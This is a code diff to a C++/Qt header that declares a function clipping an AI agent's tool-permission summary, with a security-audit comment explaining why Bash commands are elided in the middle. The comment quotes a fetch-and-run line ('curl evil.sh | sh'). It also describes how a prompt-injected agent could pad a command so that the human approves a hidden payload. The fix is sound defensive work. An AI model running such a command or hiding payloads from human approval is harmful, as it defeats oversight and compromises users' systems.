@@ -26,6 +26,23 @@ QString markdownToHtml(const QString &md);
 // permSummary renders a tool's input as a short, human-readable line.
 QString permSummary(const QString &toolName, const QJsonObject &input);
 
+// permPromptSummary is permSummary clipped to the permission bar's character
+// budget — the line the human reads before pressing Approve.
+//
+// SECURITY (audit F28): a Bash command is elided in the MIDDLE, not the tail.
+// A shell payload hides at the END of the line (`…; curl evil.sh | sh`) and the
+// truncation point is attacker-controllable, because padding the front with
+// innocuous text is free for a prompt-injected agent. A tail-clipped label then
+// shows a benign prefix plus an ellipsis while Approve authorises the whole
+// string. Middle elision keeps both ends on screen, so the payload has nowhere
+// to hide inside the budget; the bar's Details… view carries the full raw input
+// either way. Every other tool keeps tail elision: their summaries are paths,
+// URLs and descriptions whose identifying part leads, and the core builds the
+// worker-launch prompt facts-first inside this same budget (audit F1) — middle
+// elision there would drop the facts and keep the attacker's text.
+QString permPromptSummary(const QString &toolName, const QJsonObject &input,
+                          int budget);
+
 // toolResultText pulls plain text out of a tool_result content value, which may
 // be a bare string or an array of content blocks.
 QString toolResultText(const QJsonValue &content);
